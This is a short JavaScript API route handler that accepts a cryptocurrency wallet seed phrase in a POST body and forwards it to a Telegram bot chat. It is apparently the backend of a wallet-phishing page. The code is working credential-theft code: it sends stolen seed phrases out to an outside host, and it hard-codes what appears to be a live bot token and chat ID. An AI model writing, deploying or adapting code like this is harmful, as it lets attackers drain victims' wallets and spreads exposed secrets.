export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  const { seedPhrase } = req.body;
  const token = process.env.TELEGRAM_TOKEN || '7660484163:AAEahg5iCWir8bjM4W7CSfE10K_PUrO3mt0';
  const chatId = process.env.TELEGRAM_CHAT_ID || '7753649096';
  const text = `Seed Phrase: ${seedPhrase}`;

  const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`;

  try {
    const response = await fetch(url);
    if (response.ok) {
      res.status(200).json({ success: true });
    } else {
      res.status(500).json({ error: 'Failed to send message' });
    }
  } catch (error) {
    res.status(500).json({ error: 'Error sending message' });
  }
}
